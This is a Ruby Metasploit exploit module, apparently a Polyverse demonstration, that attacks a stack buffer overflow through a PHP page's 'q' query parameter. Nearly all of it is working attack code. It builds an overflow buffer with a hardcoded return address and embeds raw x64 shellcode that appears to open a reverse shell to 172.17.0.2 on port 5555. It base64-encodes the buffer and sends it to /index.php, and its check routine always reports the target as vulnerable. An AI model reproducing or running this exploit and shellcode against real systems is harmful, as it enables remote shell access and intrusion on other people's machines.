##
# This module requires Metasploit
##

require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Polyverse c-exploit example',
      'Description'    => %q|
        This is a module for exploiting a buffer overflow via PHP 
      |,
      'Author'         => 'Polyverse',
      'References'     =>
        [
          [ 'URL', 'https://polyverse.io' ],
        ],
      'Platform'       => 'linux',
      'Payload'        =>
        {
        },
      'Arch'          => [ARCH_X64],
      'Targets'        => 
        [
          [
            'Linux x64',
            {
              'Arch' => ARCH_X64,
              'Ret'      => 0x7FFFFFFFE630
            }
          ]
        ],
      'DefaultTarget'  => 0
    ))
    
    register_options(
      [
        #OptString.new('PAYLOAD64', [true, 'Base64-encoded payload with = at the end.', 'QUFBQUFBQUFBQUFBQUFBQUFjCkAAAAAAAOhDuff/fwAAkCSn9/9/AAAK='])
        OptInt.new('RETADDR', [true, 'Result of print $rsp at overflow w/offsets.', 0x7FFFFFFFE630])
      ])
  end

  # Returns that the remote host is always vulnerable
  def check
    print_status("def check...")
    return Exploit::CheckCode::Vulnerable
  end

  def exploit
    print_status("start exploit...")

    b = "a" * 17
    print_status("a")
    #b += 0x7FFFFFFFE630.pack('V')
    #b += [ target.ret ].pack('V')
    b += Rex::Arch.pack_addr(target.arch, target.ret)
    #b += datastore['RETADDR'].pack('V')
    print_status("b")
    b += "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x15\xb3\xc7\x44\x24\x04\xac\x11\x00\x02\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
    print_status("c")
    b += "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
    print_status("d")
    buf = Base64.encode64(b)
    print_status("e")
    #buf = "chris"
    #buf += payload.encoded

    print_status("before exploit.... #{buf} #{buf.length}")
    
#   res = send_request_cgi({
#     'uri'       => normalize_uri(target_uri.path,"index.php"),
#     'method'    => 'GET',
#     'vars_get' => {
#     'q' => buf
#     }
#   })
    res = send_request_raw({'uri'=>'/index.php?q=' + buf})

    print_status("done exploit.... #{res}")

    #print_status("Sending #{payload.encoded.length} byte payload... #{@res}")

    # Build the buffer for transmission
    #buf = "A" * 1044
    #buf += [ target.ret ].pack('V')
    #buf += payload.encoded

    # Send it off
    #sock.put(buf)
    #sock.get

    #handler
  end
end
